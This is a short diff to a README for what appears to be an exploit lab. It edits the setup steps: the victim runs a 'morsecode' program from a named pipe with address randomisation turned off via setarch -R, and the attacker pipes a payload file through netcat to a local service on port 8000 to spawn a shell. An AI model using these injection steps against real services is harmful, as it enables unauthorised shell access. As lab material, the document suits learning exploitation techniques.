@@ -57,7 +57,7 @@ Upon connecting to the victim's hosted service with netcat, the attacker injects
 3. On another terminal, execute the morsecode program, redirecting input from the named pipe:
 
   ```bash
-  $ cat pip | setarch arch -R ./morsecode
+  cat pip | setarch `arch` -R ./morsecode
   ```
 
 #### Attacker's Machine
@@ -67,7 +67,7 @@ Upon connecting to the victim's hosted service with netcat, the attacker injects
 3. Inject the payload into the victim's service by connecting to it with netcat:
 
   ```bash
-  $ (cat payload; cat) | nc 127.0.0.1 8000
+  $ (cat payload.bin; cat) | nc 127.0.0.1 8000
   ```
 
 Verify the successful injection by checking the spawned shell on the victim's machine.
